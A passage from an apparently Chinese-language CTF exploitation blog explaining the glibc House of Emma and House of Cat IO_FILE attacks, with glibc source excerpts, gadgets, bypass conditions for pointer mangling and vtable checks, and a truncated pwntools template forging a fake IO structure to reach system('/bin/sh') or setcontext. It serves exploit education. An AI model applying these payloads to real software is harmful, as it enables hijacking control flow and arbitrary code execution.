</span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几个函数内存在任意函数指针调用，且函数指针来源于_IO_cookie_file 结构体，<strong>这个结构体是 _IO_FILE_plus 的扩展</strong>，如果可以控制 IO 的内容，大概率这部分的数据也是可控的，并且其的<strong>第一个参数也是来源于这个结构.也就是可以控制rdi</strong>所以可以把其当做一个类似于 __free_hook 的 Hook 来利用。</p><p>结构体定义在glibc/libio/libioP.h中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p><strong>绕过 PTR_DEMANGLE</strong></p><p>在上面的分析中，暂时忽略了一个可能会存在的问题，也就是在上面代码中函数指针调用前所执行的 PTR_DEMANGLE （指针保护）选项是默认开启的，也就是<code>cookie_io_functions_t</code>中的值应该是加密过后的,这意味着需要解决指针加密的问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure><p>根据 <strong>GLIBC Wiki</strong> 上的解释，可以得知这个是 GLIBC 的一项安全功能，用于增加攻击者在 GLIBC 结构中操纵指针（尤其是函数指针）的难度。这时，通过调试可以得知，这个值存在于 TLS 段上，将其 ROR 移位 0x11 后再与指针进行异或。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/940906_U9ZGVURG434TPE6.png" alt=""></p><p>fs[0x30] 的值位于与 libc 相邻的空间中，<strong>这个位置距离 libc 地址的偏移固定</strong>，虽然无法泄露<strong>出这个位置随机值的内容</strong>,但是可以<strong>利用很多方法对其进行写入</strong>：</p><ol><li>Fastbin Reverse Into Tcache</li><li>Tcache Stashing Unlink Attack</li><li>LargeBin Attack</li></ol><p>但无论使用什么方法，根本思想：还是让这个本来是随机的、不确定的异或值，转变为已知的地址。而通常在满足能够利用 IO_FILE 的情况下，这个前置要求都能够被满足。</p><p>最后因为emma调用链中<strong>rdi是可控</strong>的,所以可以在setcontetxt之前用一些gadget<strong>先由rdi控制rdx</strong></p><p>例如如下两个,分别在2.38和2.31找到的gadget</p><p><code>mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</code></p><p><code>mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</code></p><h3 id="实操可能的问题"><a href="#实操可能的问题" class="headerlink" title="实操可能的问题"></a>实操可能的问题</h3><p>如果我们的选择的是利用house of kiwi来触发stderr的io流函数,在实际操作中，可能因为 stderr 的指针存放在 bss 段上，从而导致无法篡改。</p><p>只能使用 exit 来触发 FSOP，但是又会发现如果通过 exit 来触发 FSOP，<strong>会遇到在 exit 中也有调用指针保护的函数指针执行，但此时的异或内容被我们所篡改，使得无法执行正确的函数地址</strong>，且此位置在 FSOP 之前，从而导致程序没有进入 IO 流就发生了错误。</p><p>这种时候就可以考虑构造两个 IO_FILE，且后者指针处于前者的 _chains 处，前者用 <a href="https://www.anquanke.com/post/id/216290">GLIBC2.24 之前的 IO_FILE 攻击</a> 的思想在 __pointer_chk_guard 处写已知内容，后者再用 House_OF_Emma 来进行函数指针调用。 </p><h2 id="例题-5"><a href="#例题-5" class="headerlink" title="例题"></a>例题</h2><p><strong>2021湖湘杯-House_OF_Emma</strong></p><h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h1><h2 id="概要-13"><a href="#概要-13" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用<strong>_IO_wfile_jumps</strong>中的<strong>_IO_wfile_seekoff</strong>函数，然后进入到<strong>_IO_switch_to_wget_mode</strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<strong>_IO_wfile_seekoff</strong>即可（通常是结合<strong>__malloc_assert</strong>，改vtable为<strong>_IO_wfile_jumps+0x10</strong>）。</p><p><strong>利用条件:</strong></p><ol><li>可以任意写一个可控地址（LargeBin Attack,Tcache Stashing Unlink Attack…）</li><li>能够泄露堆地址和libc基址</li><li>能够触发IO流(FSOP或触发__malloc_assert,或者程序中存在puts等能进入IO链的函数),执行IO相关函数</li></ol><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-13"><a href="#原理-13" class="headerlink" title="原理"></a>原理</h2><p>在高版本libc中，当攻击条件有限（如不能造成任意地址写）或者libc版本中无hook函数（libc2.34及以后）时，伪造fake_IO进行攻击是一种常见可行的攻击方式，常见的触发IO函数的方式有FSOP、__malloc_assert（当然也可以用puts等函数，<strong>只不过需要任意地址写任意值直接改掉libc中的stdout结构体</strong>），<strong>当进入IO流时会根据vtable指针调用相关的IO函数</strong>，如果在题目中造成任意地址写一个可控地址（如large bin attack、tcache stashing unlink attack、fastbin reverse into tcache），然后伪造fake_IO结构体配合恰当的IO调用链，可以达到控制程序执行流的效果。</p><p>House of emma是glibc2.34下常用的攻击手法之一，利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大。但是需要攻击位于TLS的<strong>_pointer_chk_guard</strong>，并且远程可能需要爆破TLS偏移。</p><h3 id="vtable检查"><a href="#vtable检查" class="headerlink" title="vtable检查"></a>vtable检查</h3><p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr -(<span class="type">uintptr_t</span>)__start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable 段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p><p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，<strong>可以修改vtable指针为虚表段内的任意位置</strong>，也就是对于某一个<strong>_IO_xxx_jumps</strong>的任意偏移，使得其调用攻击者想要调用的IO函数。</p><h3 id="malloc-assert与FSOP"><a href="#malloc-assert与FSOP" class="headerlink" title="__malloc_assert与FSOP"></a>__malloc_assert与FSOP</h3><p>在glibc中存在一个函数_malloc_assert，其中会根据vtable表如_IO_xxx_jumps调用IO等相关函数；</p><p><strong>该函数最终会根据<code>stderr</code>这个IO结构体进行相关的IO操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">         <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">             __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             file, line,</span><br><span class="line">             function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>house of kiwi提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个</p><blockquote><p>1.topchunk的大小小于MINSIZE(0X20)<br>2.prev inuse位为0<br>3.old_top页未对齐</p></blockquote><hr><p>下面介绍另一种触发house of cat的方式FSOP</p><p>程序中所有的_IO_FILE 结构用_chain连接形成一个单链表，链表的头部则是_IO_list_all</p><p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行<code>_IO_flush_all_lockp</code>函数，<strong>这个函数会根据_IO_list_all刷新链表中的所有文件流，</strong></p><p>在libc中代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>其中会调用vtable中的IO函数_IO_OVERFLOW，根据上面所说的虚表偏移可变思想，这个地方的虚表偏移也是可修改的，然后配合伪造IO结构体可以执行house of cat的调用链</strong></p><p>FSOP有三种情况</p><ol><li>能从main函数中返回</li><li>程序中能执行exit函数</li><li>libc中执行abort</li></ol><p><strong>第三种情况在高版本中已经删除</strong>;</p><p>__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。</p><h3 id="一种可行的IO调用链"><a href="#一种可行的IO调用链" class="headerlink" title="一种可行的IO调用链"></a>一种可行的IO调用链</h3><p>在<strong>_IO_wfile_jumps</strong>结构体中，会根据虚表进行相关的函数调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<strong>_IO_wfile_seekoff</strong>函数代码如下(<strong>glibc/libio/wfileops.c</strong>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中fp结构体是我们可以伪造的，可以控制fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base来调用_IO_switch_to_wget_mode这个函数，继续跟进代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><u>而_IO_WOVERFLOW是glibc里定义的一个宏调用函数</u></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure><p><strong><u>对_IO_WOVERFLOW没有进行任何检测</u></strong>，为了便于理解，我们再来看看汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class="line"> </span><br><span class="line">  0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p>主要关注这几句，做了一下几点事情</p><ol><li><p>将[rdi+0xa0]处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。</p></li><li><p>将新赋值的[rax1+0x20]处的内容赋值给rdx。</p></li><li>将[rax1+0xe0]处的内容赋值给rax，称之为<strong>rax2</strong>。</li><li>call调用[rax2+0x18]处的内容。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d34&lt;_IO_switch_to_wget_mode+4&gt;   mov  rax, qword ptr [rdi+0xa0]</span><br><span class="line">0x7f4cae745d3f&lt;_IO_switch_to_wget_mode+15&gt;  mov  rdx, qword ptr [rax+0x20]</span><br><span class="line">0x7f4cae745d49&lt;_IO_switch_to_wget_mode+25&gt;  mov  rax, qword ptr [rax+0xe0]</span><br><span class="line">0x7f4cae745d55&lt;_IO_switch_to_wget_mode+37&gt;  call  qword ptr [rax+0x18]</span><br></pre></td></tr></table></figure><p>而rdi此时的状态:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/959842_STBECKY3R8W9W2A.png" alt=""></p><p>可以看到这是一个堆地址，而实际上此时rdi就是伪造的IO结构体的地址，也是可控的。</p><p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，</p><ul><li>在<strong>开启沙箱</strong>的情况下，假如把最后调用的<strong>[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag</strong>；</li><li>如果<strong>未开启沙箱</strong>，则只需把<strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串</strong>，就可执行system(“/bin/sh”)</li></ul><h3 id="fake-IO结构体需要绕过的检测"><a href="#fake-IO结构体需要绕过的检测" class="headerlink" title="fake_IO结构体需要绕过的检测"></a>fake_IO结构体需要绕过的检测</h3><p>完全按照流程走下来需要满足的条件是</p><ol><li><p>fp-&gt;_lock是一个可写地址_</p></li><li><p>_(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</p><p>   || (_IO_vtable_offset (fp) == 0</p><p>​     &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</p><p>​      > fp-&gt;_wide_data-&gt;_IO_write_base))</p></li><li><p>fp-&gt;_mode!=0</p></li><li><p>fp-&gt;_wide_data-&gt;_IO_write_ptr> fp-&gt;_wide_data-&gt;_IO_write_base或者_IO_CURRENTLY_PUTTING标志为1</p></li><li><p>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</p></li></ol><p>整理一下可以缩减为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mode&gt;<span class="number">0</span></span><br><span class="line">_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end<span class="comment">//这个条件不知道是在哪里要求的,我跟着流程似乎并没有找到这个条件</span></span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址）</span><br></pre></td></tr></table></figure><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>1.修改<strong>_IO_list_all</strong>为可控地址（<strong>FSOP</strong>）或修改<strong>stderr</strong>为可控地址(<strong>__malloc_assert</strong>)。<br>2.在上一步的可控地址中伪造<strong>fake_IO结构体</strong>(也可以在任意地址写的情况下修改<strong>stderr、stdout</strong>等结构体)。<br>3.通过<strong>FSOP</strong>或<strong>malloc</strong>触发攻击。<br><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/959842_JDJKTRK7GJUEUFR.png" alt=""></p><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>house of cat的模板，原理参照上图。伪造IO结构体时只需修改<strong>fake_io_addr</strong>地址，<strong>_IO_save_end</strong>为想要调用的函数，<strong>_IO_backup_base</strong>为执行函数时的rdx，以及修改_flags为执行函数时的rdi;FSOP和利用__malloc_assert触发house of cat的情况不同，</p><p>需要具体问题具体调整（FSOP需将vtable改为IO_wfile_jumps+0x30）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE +=p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span 